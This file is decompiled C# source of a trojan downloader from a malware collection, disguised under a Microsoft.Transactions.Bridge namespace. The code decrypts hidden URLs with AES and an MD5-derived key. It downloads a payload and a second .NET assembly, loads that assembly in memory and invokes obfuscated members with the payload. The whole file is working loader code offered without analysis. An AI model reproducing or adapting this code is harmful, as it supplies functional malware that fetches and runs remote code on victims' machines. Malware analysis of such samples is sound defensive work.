// Decompiled with JetBrains decompiler
// Type: Microsoft.Transactions.Bridge.Program
// Assembly: Microsoft.Transactions.Bridge, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 51116F84-6FE2-4BD6-A908-2C88E06F45BB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan.MSIL.Picsys.gen-d64123468b2dcb11e9205288e0a6cb144a448944457a708807b7345a8a766675.exe

using System;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace Microsoft.Transactions.Bridge
{
  internal static class Program
  {
    [STAThread]
    private static void Main()
    {
      using (WebClient webClient = new WebClient())
      {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        string address1 = Program.IAsyncLocal("dxXMhxpDSmRymb2S5KdNFcrLshKCShlViDnouptAz1CYChKKcsVTOMWnod/By43v", "WjCLSrQtABNbzJRCfGEZgBcPoRFTqHMLedSMDDmYnXTGxyNKHiZQJaPsYFEpwKAWXkKiKWWykGLHaHRMgjMYN");
        byte[] numArray = webClient.DownloadData(address1);
        string address2 = Program.IAsyncLocal("saLS7eHrQIZmOZBXrlJ2BzUE0/PWWGPnkEbCIWEnx2Pi6qgGFcp0JpnC273+/IQC3e7CEOv7yUaDMXdWxxNrKglG8AWmO00aWm1KOtKT0V4Z24ArspGX6xb5U67HvIPJ", "WjCLSrQtABNbzJRCfGEZgBcPoRFTqHMLedSMDDmYnXTGxyNKHiZQJaPsYFEpwKAWXkKiKWWykGLHaHRMgjMYN");
        Assembly assembly = Assembly.Load(webClient.DownloadData(address2));
        string empty = string.Empty;
        object args = (object) new object[3]
        {
          (object) Assembly.GetExecutingAssembly().Location,
          (object) empty,
          (object) numArray
        };
        assembly.GetType(string.Join("", new string[1]
        {
          "丁吉喇代腿比黑德曲的拉底報爾盟代桃.截和明诶和拉桃進雙曲迪流子歐瑪流迪伴托克破士士杰的本和伴一本拉弗勒和喬報瑪桃爾截本報的劇喬德本氏的嗯盟拉截氏"
        })).InvokeMember(string.Join("", new string[1]
        {
          "本拉和我闕流流斯喬士氏流伴截我拉氏克士我歐斯瑪網內截配桃喬盟曲流金我拉子瑪和德德喇桃氏的庵報我一內網進曲普迪"
        }), BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) args);
      }
    }

    public static string IAsyncLocal(string ScopeMustBeUIElement, string AllowDashesRangeWorker)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      string str = "";
      try
      {
        byte[] destinationArray = new byte[32];
        byte[] hash = cryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(AllowDashesRangeWorker));
        Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
        Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
        rijndaelManaged.Key = destinationArray;
        rijndaelManaged.Mode = CipherMode.ECB;
        ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor();
        byte[] inputBuffer = Convert.FromBase64String(ScopeMustBeUIElement);
        str = Encoding.ASCII.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
      }
      catch (Exception ex)
      {
      }
      return str;
    }
  }
}
